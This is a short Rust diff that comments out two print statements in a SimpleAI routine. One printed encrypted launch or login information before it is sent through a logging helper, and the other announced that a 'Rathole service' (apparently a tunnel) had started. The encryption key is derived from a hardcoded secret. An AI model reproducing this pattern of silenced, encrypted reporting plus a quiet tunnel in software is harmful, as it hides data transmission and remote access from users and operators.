@@ -80,7 +80,7 @@ impl SimpleAI {
                 let shared_key = b"Simple_114.124";
                 let aes_key = env_utils::hkdf_key(shared_key);
                 let ctext = URL_SAFE_NO_PAD.encode(env_utils::encrypt(loginfo.as_bytes(), &aes_key));
-                println!("ctext: {}", ctext);
+                //println!("ctext: {}", ctext);
                 match tokio::time::timeout(Duration::from_secs(5), env_utils::logging_launch_info(&ctext)).await {
                     Ok(_) => {},
                     Err(e) => {
@@ -88,7 +88,7 @@ impl SimpleAI {
                     }
                 }
 
-                println!("Rathole service started");
+                //println!("Rathole service started");
             });
         });
         Ok(())
